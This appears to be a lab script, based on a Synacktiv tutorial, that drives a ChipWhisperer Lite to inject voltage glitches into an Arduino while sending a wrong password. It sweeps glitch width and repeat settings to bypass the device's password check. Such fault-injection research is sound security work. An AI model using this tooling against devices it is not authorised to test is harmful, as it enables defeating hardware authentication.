# Main source: https://www.synacktiv.com/en/publications/how-to-voltage-fault-injection#secure_boot

# ByPass Password Enhanced Attack

import chipwhisperer as cw
import time
import serial
import os

# TEST = 0    # 0: Simple Manual glitch @ 8MHz
TEST = 1    # 1: Enhanced glitch @ 192MHz

FULL_CODE = 0
SCOPETYPE = 'OPENADC'
PLATFORM = 'CWLITEXMEGA'

def vglitch_reset(scope, delay=0.005):
    """
    """
    hp = scope.io.glitch_hp
    lp = scope.io.glitch_lp

    scope.io.glitch_hp = False
    scope.io.glitch_lp = False

    time.sleep(delay)

    scope.io.glitch_hp = hp
    scope.io.glitch_lp = lp

def reset_target(_scope):
    if PLATFORM == "CW303" or PLATFORM == "CWLITEXMEGA":
        _scope.io.pdic = 'low'
        time.sleep(0.1)
        _scope.io.pdic = 'high_z' #XMEGA doesn't like pdic driven high
        time.sleep(0.1) #xmega needs more startup time

def reboot_flush(_scope):
    reset_target(_scope)
    # target.flush()

# disable logging
cw.set_all_log_levels(cw.logging.CRITICAL)

# ------------------------------
# Initiate Connection to the Chipwhisperer Lite Kit
# scope = cw.scope()
print("Connecting to CW_Lite.")
try:
    if not scope.connectStatus:
        scope.con()
except NameError:
    scope = cw.scope()
# m0
print("CW_Lite initialized.")

if FULL_CODE >= 1:
    # Time Delays & initialization before glitch attack
    time.sleep(0.05)
    scope.default_setup()
    print("CW_Lite Default Configuration applied.")
    print("-------------------")
    # m1
    # ------------------------------

    # We adjust the clock to fit with the ATMega 328p frequency.
    scope.clock.clkgen_freq = 8E6 
    # scope.clock.clkgen_freq = 16E6 # Arduino NANO uses 16 MHz clock

    reboot_flush(scope)
    scope.arm()
    # scope.capture()
else:
    if TEST == 0:
        scope.clock.clkgen_freq = 8E6 #16E6
    elif TEST == 1:
        scope.clock.clkgen_freq = 192E6 # Maximum frequency of the internal clock of the CW



# scope.dis()
# mmmmmmm
# Set clock to internal chipwhisperer clock
scope.glitch.clk_src = "clkgen" # set glitch input clock

if TEST == 0:
    #"enable_only" - insert a glitch for an entire clock cycle
    # based on the clock of the CW (here at 8MHz so 0,125 micro seconds)
    # Typically too powerful for most devices
    # Uses "repeat" & "ext_offset" parameters
    scope.glitch.output = "enable_only"
elif TEST == 1:
    # "glitch_only" - insert a glitch for a portion of a clock cycle 
    # based on scope.glitch.width and scope.glitch.offset
    scope.glitch.output = "glitch_only" # glitch_out = clk ^ glitch

# scope.glitch.trigger_src = "ext_single" # glitch only after scope.arm() called

# Enable Low power and High power transistors.
if PLATFORM == "CWLITEXMEGA":
    scope.io.glitch_lp = True
    scope.io.glitch_hp = True
# LP provides a faster response, so sharper glitches. HP can provide better results for targets that have strong power supplies or decoupling capacitors that ca not be removed.

# scope.io.vglitch_reset() #it simply sets scope.io.glitch_hp/lp to False, waits delay seconds, then returns to their original settings. In short, reset the glitching module.
vglitch_reset(scope)

# # -----------------------------------------
# # How many times the glitch is repeated
# scope.glitch.repeat = 15 #15

# # Send the glitch
# scope.glitch.manual_trigger()

# scope.dis()
# print("Disconnect from CW_Lite .. Exiting")
# exit()
# # -----------------------------------------

## Glitch Module Parameters
# offset: Where in the output clock to place the glitch. Can be in the range [-48.8, 48.8]
# width: How wide to make the glitch. Can be in the range [-50, 50].
# ext_offset: The number of clock cycles after the trigger to put the glitch.
# repeat: The number of clock cycles to repeat the glitch for. 
#         Higher values increase the number of instructions that can be glitched
#         , but often increase the risk of crashing the target.
# trigger_src: How to trigger the glitch.

## CW Glitch Controller
# Potential Results:
#    "success": where our glitch had the desired effect
#    "reset":   where our glitch had an undesirable effect. Often,
#               this effect is crashing or resetting the target, which is why we're calling it "reset"
#    "normal":  where you glitch didn't have a noticable effect.

# Create a Glitch Controller, and tell it what glitch parameters we want to scan through, in this case width and offset:
# gc = cw.GlitchController(groups=["success", "reset", "normal"], parameters=["width", "offset", "ext_offset", "tries"])
gc = cw.GlitchController(groups=["success", "reset", "normal"], parameters=["width", "repeat"]) 

# You can set ranges for each glitch setting
gc.set_range("width", 1, 45)
# gc.set_range("repeat", 1, 50)
gc.set_range("repeat", 10, 30)
# Each setting moves from min to max based on the global step:
gc.set_global_step(0.4)
# Set "repeat" step to 1
gc.set_step("repeat", 1)

# We can print out all the glitch settings to see how this looks:
for glitch_setting in gc.glitch_values():
    print("width: {:4.1f}, repeat: {:4.1f}".format(glitch_setting[0], glitch_setting[1]))

for glitch_setting in gc.glitch_values():
# Try to connect to the arduino uno using the serial connection:
    try:
        with serial.Serial("/dev/ttyACM1", 115200, timeout=1) as ser:
            print("Serial port successfully opened.")
            scope.glitch.width = glitch_setting[0]
            scope.glitch.repeat = glitch_setting[1]
            print(f"Width: {scope.glitch.width}, repeat: {scope.glitch.repeat}")
# Send the glitch and a wrong password
            scope.glitch.manual_trigger()
            ser.write(b'tatat')
            # scope.io.vglitch_reset()
            vglitch_reset(scope)
# If the serial connection breaks, use uhubctl to poweroff / poweron the usb port on the USB hub where the Arduino Uno is plugged
    except Exception as e:
        os.system('/usr/sbin/uhubctl -S -p 2 -a cycle > /dev/null 2>&1')
        time.sleep(1)
        pass


scope.dis()
exit()
# for i in range(380):
# for i in range(35):
if TEST == 0:
    for i in range(1, 30):
        print("@i=", i)
        # scope.io.vglitch_reset(0.5)
        vglitch_reset(scope, 0.5)
        scope.glitch.repeat = i
        scope.glitch.manual_trigger()

elif TEST == 1:
    gc = cw.GlitchController(groups=["success", "reset", "normal"], parameters=["width", "repeat"])
    gc.set_range("width", 0, 35)
    gc.set_range("repeat", 1, 35)
    # The steps could be reduced to be more precise
    gc.set_global_step(1)

    for glitch_setting in gc.glitch_values():
        scope.glitch.width = glitch_setting[0]
        scope.glitch.repeat = glitch_setting[1]
        print(f"{scope.glitch.width} {scope.glitch.repeat}")
        scope.glitch.manual_trigger()
        # scope.io.vglitch_reset()
        vglitch_reset(scope)


scope.dis()